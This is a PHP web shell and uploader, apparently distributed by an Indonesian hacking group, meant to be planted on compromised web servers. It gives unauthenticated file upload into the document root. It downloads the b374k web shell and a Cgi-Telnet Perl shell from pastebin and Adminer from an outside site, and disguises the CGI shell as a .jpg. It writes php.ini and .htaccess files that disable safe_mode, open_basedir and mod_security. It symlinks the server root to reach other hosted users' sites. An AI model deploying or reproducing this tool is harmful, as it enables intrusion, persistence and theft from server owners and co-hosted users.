<?php
echo "<title>[Ecchi Hidden Uploader]</title>
<meta name='author' content='./EcchiExploit'>
<meta charset='UTF-8'>
<meta name='keywords' content='[BlackHat Hacker Indonesia]'>
<meta name='description' content='No Ecchi No Life'>
<link rel='icon' type='image/x-icon' href='https://i.ibb.co/WH4DrnR/IMG-20190901-WA0263.jpg'>
<meta name='og:image' content='https://i.ibb.co/WH4DrnR/IMG-20190901-WA0263.jpg' alt='IMG-20190901-WA0263'>
<meta name='og:image:securel_url' content='https://i.ibb.co/WH4DrnR/IMG-20190901-WA0263.jpg' alt='IMG-20190901-WA0263'>
<style>
body { background-image:url(https://wallpapercave.com/wp/Yad5yKT.jpg); background-size:cover; font-family: 'Comic Sans MS' } #test{padding:20px} p{margin-bottom:10px; color:#FFF ;}
textarea {
	border: 2px solid #00F0FF;
	width: 70%;
	height: 200px;
	padding-left: 5px;
	margin: 10px auto;
	resize: none;
	background: transparent;
	color: #ffffff;
	font-family: 'Comic Sans MS';
	font-size: 13px;
}
input { background: transparent; color: white; border: 1px solid blue; }
select { background: transparent; color: white; border: 1px solid blue; }
input[type=submit]{ 
 	background:#000000; 
 	color:red; 
 	margin:0 4px; 
 	font-size:13px; 
 	font-family: 'Comic Sans MS';
 	border:1px solid dodgerblue; 
 	cursor:pointer;
 	-moz-border-radius: 5px;
    -webkit-border-radius: 5px;
    -khtml-border-radius: 5px;
} 
input[type=submit]:hover{ 
 	border-bottom:1px solid #ffffff;
 	font-size:13px;
 	 font-family: 'Comic Sans MS';
 	border-top:1px solid #ffffff; 
} 
</style>";
echo'<audio src="http://dl.forunesia.com/mp3/07/[Forunesia]%20Kaze%20no%20Uta.mp3" autoplay="autoplay"></audio>';
echo"<center><img src=https://i.ibb.co/WH4DrnR/IMG-20190901-WA0263.jpg id=Image1 style=width:650px;height:320px;></div><br><br>";
echo "<center><div><form method=post>
 <input type=\"submit\" value=\"Creat B374k Shell\" name='generateb374k'>
<input type=\"submit\" value=\"SymLink\" name='generateSER'>
<input type=\"submit\" value=\"Adminer\" name='adminerGenerate'>
<input type=\"submit\" value=\".HTACCESS\" name='htaccessGenerate'>
<input type=\"submit\" value=\"Cgi-Telnet 1.4\" name='generatePerl'>
<input type=\"submit\" value=\"PHP.INI\" name='phpiniGenerate'>
        </form></form>";
        echo "<font size=5 color='blue'>System : ";
        echo"</font>";
echo"<font color='white'>";
echo "<b>".php_uname()."</b></font><br><br>";
echo "<form method='post' enctype='multipart/form-data'>
      <input type='file' name='idx_file'>
      <input type='submit' name='upload' value='Upload Bujank!1!1'>
      </form>";
$root = $_SERVER['DOCUMENT_ROOT'];
$files = $_FILES['idx_file']['name'];
$dest = $root.'/'.$files;
if(isset($_POST['upload'])) {
    if(is_writable($root)) {
        if(@copy($_FILES['idx_file']['tmp_name'], $dest)) {
            $web = "http://".$_SERVER['HTTP_HOST']."/";
            echo "<font color=green size=3>Sukses Cuk! -> <a href='$web/$files' target='_blank'><b><u>$web/$files</u></b></a></font>";
        } else {
            echo "</font size=5 color=red>Gagal Upload Di Document Root.</font>";
        }
    } else {
        if(@copy($_FILES['idx_file']['tmp_name'], $files)) {
            echo "<font color=#3711BC size=5>Sukses Upload <b></font><font color=#0EAC9C size=4>$files</b></font><font color=#15769C size=5> Di Sini</font>";
        } else {
            echo "</font color=red size=3>Gagal Cuk!1!1!</font>";
        }
    }
}
function GenerateFile($name,$content)
{
    $file = @fopen($name,"w+");
    @fwrite($file,$content);
    @fclose($file);
    return true;
}
if(isset($_POST['adminerGenerate']))
{
@mkdir("adminer", 0755);
@chdir("adminer");                      
$adminer = "https://www.bijnesbhai.com/css/adminer.txt";
$file = file_get_contents($adminer);
$open = fopen("adminer.php" , 'w');
fwrite($open,$file);
fclose($open);
if($open) {
echo "<br><b><a href=adminer/adminer.php target='_blank'><div><span style=color:#6dc205;font-family:Arial;font-size:11px;>Click Linknya Disini To Open Adminer </span>"; }
  }
$ini_php="<?
echo ini_get(\"safe_mode\");
echo ini_get(\"open_basedir\");
include(\$_GET[\"file\"]);
ini_restore(\"safe_mode\");
ini_restore(\"open_basedir\");
echo ini_get(\"safe_mode\");
echo ini_get(\"open_basedir\");
include(\$_GET[\"ss\"]);
?>";
if(isset($_POST['phpiniGenerate']))    
        {
GenerateFile("php.ini",
"safe_mode = Off
disable_functions = NONE
safe_mode_gid = OFF
open_basedir = OFF");
$link="<br><a href=php.ini target='_blank'><div><span style=color:#6ebe0b;font-family:Verdana;font-size:11px;>Click Linknya Disini To Run PHP.INI</span></div></a>";
echo $link;
}
if(isset($_POST['generateSER']))
        {
@mkdir('BHI', 0777);
$hta="Options all\n
      DirectoryIndex Sux.html\n
      AddType text/plain .php\n
      AddHandler server-parsed .php\n
      AddType text/plain .html\n
      AddHandler txt .html\n
      Require None\n
      Satisfy Any";
$htaccess=@fopen('BHI/.htaccess', 'w');
fwrite($htaccess, $hta);
@symlink("/", "BHI/root");
$akps=@file("/etc/named.conf");
if(!$akps)
{
    die('<script>alert("./EcchiExploit :~# /etc/named.conf Not Found ! ")</script>');
}
echo "<div class=container><br /><font size=4>[+] Total Domanis Found: </font><font color=red>".count($akps)."</font><br /><br /><table align=center border=1 width=59% cellpadding=5><tr><td>Domains</td><td>Users</td><td>Exploit</font></td></tr>";

foreach($akps as $akp)

{
    if(eregi("zone", $akp))
    {
        preg_match_all('#zone "(.*)" #', $akp, $akpzz);
        flush();
        if(strlen(trim($akpzz[1][0]))>2)
        {        	$user=posix_getpwuid(@fileowner("/etc/valiases/".$akpzz[1][0]));
            echo "<tr><td><a href=http://www.".$akpzz[1][0]." target=_blank>".$akpzz[1][0]."</a><td>".$user['name']."
            </td><td><a href=/Bhi/root/home/".$user['name']."/public_html/ target=_blank>SymLink</a></td></tr>";
            flush();
        }
    }
}
        }
if(isset($_POST['generateb374k']))
 {
@mkdir("b374k", 0755);
@chdir("b374k");                      
$b374k_2 = "https://pastebin.com/raw.php?i=apYjJ5VK";
$file = file_get_contents($b374k_2);
$open = fopen("b374k.php" , 'w');
fwrite($open,$file);
fclose($open);
if($open) {
echo "<br><b><a href=b374k/b374k.php target='_blank'><div><span style=color:#6dc205;font-family:Arial;font-size:11px;>Click Linknya Disini To Open b374k 2.7 </span><br><span style=color:#6dc205;font-family:Arial;font-size:11px;>Password Default : b374k</div></a></b>"; }
           }          
if(isset($_POST['htaccessGenerate']))    
        {
@mkdir("access", 0755);
@chdir("access");        
GenerateFile(".htaccess",
"<IfModule mod_security.c>
SecFilterEngine Off
SecFilterScanPOST Off
SecFilterCheckURLEncoding Off
SecFilterCheckCookieFormat Off
SecFilterCheckUnicodeEncoding Off
SecFilterNormalizeCookies Off
</IfModule>" );
echo "<br><div><span style=color:#6ebe0b;font-family:Verdana;font-size:11px;>.htaccess Has Been Generated Successfully</span></div> ";
        }           
if(isset($_POST['generatePerl']))
        {
@mkdir("cgi", 0755);
@chdir("cgi");
$cgi_2 = "http://pastebin.com/raw.php?i=6ELN8bjS";
$file = file_get_contents($cgi_2);
$open = fopen("Cgi-14.jpg" , 'w');
fwrite($open,$file);
fclose($open);
if($open) {
echo "<br><b><a href=cgi/Cgi-14.jpg target='_blank'><div><span style=color:#6ebe0b;font-family:Arial;font-size:11px;>Click Linknya To Open Cgi-Telnet 1.4 </span></div></a></b>";
$htaccess = fopen(".htaccess","a+");
fwrite($htaccess,
"Options FollowSymLinks MultiViews Indexes ExecCGI
AddType application/x-httpd-cgi .jpg
AddHandler cgi-script .jpg");
fclose($htaccess);            
        }    
        }            
?>
<br><br><center><font size="6"><font color="blue">[+]</font>
<font size="6"><font color=Fuchsia> Thanks My Team <font size="6"><font color="white">[+]</font><br><font color="Navy"><marquee bgcolor="Olive" scrollamount="15%" width="70%" behavior="alternate">| BlackHat Hacker Indonesia | Manusia Biasa Team | 2Easy4Hack | Anonynonymous All Indonesia | Dark Exploit Cyber | Islamic Cyber Comunity |</marquee></font>
<br>
<br><br>
<font size="5"><font color="#21A692">Contac Me : harigrimorum990@gmail.com</font>
